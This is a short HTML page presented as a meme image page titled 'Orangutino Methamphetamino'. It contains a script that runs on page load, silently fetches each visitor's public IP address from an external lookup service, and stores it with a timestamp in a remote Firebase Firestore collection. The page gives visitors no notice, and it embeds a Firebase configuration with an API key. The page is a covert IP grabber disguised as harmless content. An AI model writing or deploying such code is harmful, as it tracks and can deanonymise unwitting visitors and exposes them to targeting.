<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<style>
  body {
    background-color: black;
    color: white;
    text-align: center;
  }
  div.image {
    width: 400px;
    height: 300px;
    background-image: url('images.jpeg'); /* dein Bild */
    background-size: cover;
    background-position: center;
    border: 1px solid white;
    margin: 20px auto;
  }
</style>
</head>
<body>
<h1>Orangutino Methamphetamino</h1>
<div class="image"></div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-firestore.js";

  // Firebase-Konfiguration
  const firebaseConfig = {
    apiKey: "AIzaSyCbA9QaYmD0Ck-VQVOaXsZvV0aFTtET0TM",
    authDomain: "imagehub-745c1.firebaseapp.com",
    projectId: "imagehub-745c1",
    storageBucket: "imagehub-745c1.firebasestorage.app",
    messagingSenderId: "719828224137",
    appId: "1:719828224137:web:f05ee9d9b22dfb6b4a9e58",
    measurementId: "G-45VHM7HWG0"
  };

  // Firebase initialisieren
  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  async function savePublicIP() {
    let publicIP = 'unknown';
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      if (response.ok) {
        const data = await response.json();
        publicIP = data.ip;
      }
    } catch (err) {
      console.error('Fehler beim Abrufen der Public IP:', err);
    }

    try {
      await addDoc(collection(db, "publicIPs"), {
        ip: publicIP,
        timestamp: serverTimestamp()
      });
      console.log('Public IP gespeichert:', publicIP);
    } catch (err) {
      console.error('Fehler beim Speichern in Firestore:', err);
    }
  }

  savePublicIP();
</script>
</body>
</html>
